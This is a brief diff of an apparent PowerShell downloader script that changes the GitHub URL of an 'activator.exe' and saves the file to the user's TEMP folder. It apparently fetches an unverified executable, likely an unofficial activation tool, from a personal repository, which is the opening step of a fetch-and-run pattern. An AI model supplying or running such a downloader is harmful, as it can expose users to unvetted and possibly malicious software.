@@ -1,4 +1,4 @@
-$url = "https://github.com/carplk/carplk.github.io/raw/refs/heads/main/activator.exe"
+$url = "https://github.com/carplk/carplk.github.io/raw/refs/heads/main/activation/activator.exe"
 $output = "$env:TEMP\activator.exe"
 
 Write-Host "Downloading..." -ForegroundColor Cyan
